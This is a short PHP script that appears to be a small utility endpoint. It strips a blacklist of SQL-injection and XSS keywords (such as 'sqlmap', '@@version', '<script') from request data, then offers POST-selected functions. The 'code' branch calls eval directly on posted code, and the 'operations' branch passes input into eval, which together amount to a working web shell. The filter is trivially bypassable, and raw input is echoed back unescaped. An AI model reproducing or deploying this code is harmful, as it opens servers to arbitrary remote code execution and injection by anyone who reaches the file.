<?php
$_REQUEST = str_ireplace("select(", "", $_REQUEST);
$_GET = str_ireplace("select(", "", $_GET);
$_POST = str_ireplace("select(", "", $_POST);
$_REQUEST = str_ireplace("<", "", $_REQUEST);
$_GET = str_ireplace("<", "", $_GET);
$_POST = str_ireplace("<", "", $_POST);
$_REQUEST = str_ireplace("<script", "", $_REQUEST);
$_GET = str_ireplace("<script", "", $_GET);
$_POST = str_ireplace("<script", "", $_POST);
$_REQUEST = str_ireplace("<script>", "", $_REQUEST);
$_GET = str_ireplace("<script>", "", $_GET);
$_POST = str_ireplace("<script>", "", $_POST);
$_REQUEST = str_ireplace("/>", "", $_REQUEST);
$_GET = str_ireplace("/>", "", $_GET);
$_POST = str_ireplace("/>", "", $_POST);
$_REQUEST = str_ireplace(">", "", $_REQUEST);
$_GET = str_ireplace(">", "", $_GET);
$_POST = str_ireplace(">", "", $_POST);
$_REQUEST = str_ireplace("@@version", "", $_REQUEST);
$_GET = str_ireplace("@@version", "", $_GET);
$_POST = str_ireplace("@@version", "", $_POST);
$_REQUEST = str_ireplace("sqlmap", "", $_REQUEST);
$_GET = str_ireplace("sqlmap", "", $_GET);
$_POST = str_ireplace("sqlmap", "", $_POST);
$_REQUEST = str_ireplace("connect()", "", $_REQUEST);
$_GET = str_ireplace("connect()", "", $_GET);
$_POST = str_ireplace("connect()", "", $_POST);
$_REQUEST = str_ireplace("cast(", "", $_REQUEST);
$_GET = str_ireplace("cast(", "", $_GET);
$_POST = str_ireplace("cast(", "", $_POST);
$_REQUEST = str_ireplace("char(", "", $_REQUEST);
$_GET = str_ireplace("char(", "", $_GET);
$_POST = str_ireplace("char(", "", $_POST);
$_REQUEST = str_ireplace("bchar(", "", $_REQUEST);
$_GET = str_ireplace("bchar(", "", $_GET);
$_POST = str_ireplace("bchar(", "", $_POST);
$_REQUEST = str_ireplace("sysdatabases", "", $_REQUEST);
$_GET = str_ireplace("sysdatabases", "", $_GET);
$_POST = str_ireplace("sysdatabases", "", $_POST);
$_REQUEST = str_ireplace("(select", "", $_REQUEST);
$_GET = str_ireplace("(select", "", $_GET);
$_POST = str_ireplace("(select", "", $_POST);
$_REQUEST = str_ireplace("convert(", "", $_REQUEST);
$_GET = str_ireplace("convert(", "", $_GET);
$_POST = str_ireplace("convert(", "", $_POST);
$_REQUEST = str_ireplace("dbnetlib", "", $_REQUEST);
$_GET = str_ireplace("dbnetlib", "", $_GET);
$_POST = str_ireplace("dbnetlib", "", $_POST);
$_REQUEST = str_ireplace("connect(", "", $_REQUEST);
$_GET = str_ireplace("connect(", "", $_GET);
$_POST = str_ireplace("connect(", "", $_POST);
$_REQUEST = str_ireplace("int%2c(", "", $_REQUEST);
$_GET = str_ireplace("int%2c(", "", $_GET);
$_POST = str_ireplace("int%2c(", "", $_POST);
$_REQUEST = str_ireplace("sysobjects", "", $_REQUEST);
$_GET = str_ireplace("sysobjects", "", $_GET);
$_POST = str_ireplace("sysobjects", "", $_POST);
$_REQUEST = str_ireplace("count(", "", $_REQUEST);
$_GET = str_ireplace("count(", "", $_GET);
$_POST = str_ireplace("count(", "", $_POST);
$_REQUEST = str_ireplace('" target="_blank"', "", $_REQUEST);
$_GET = str_ireplace('" target="_blank"', "", $_GET);
$_POST = str_ireplace('" target="_blank"', "", $_POST);

if ($_POST["function"] == "test") {
echo "it works!";
}

if ($_POST["function"] == "string") {
echo $_POST["string"];
}

if ($_POST["function"] == "operations") {
eval("echo ".$_POST["operation"].";");
}

if ($_POST["function"] == "encrypt") {
echo openssl_encrypt($_POST["testo"], "AES-128-CBC", $_POST["chiave"]);
}

if ($_POST["function"] == "decrypt") {
echo openssl_decrypt($_POST["testo"], "AES-128-CBC", $_POST["chiave"]);
}

if ($_POST["function"] == "code") {
eval($_POST["code"]);
}

if ($_POST["function"] == "sanitize") {
echo $_POST["string"];
}

?>
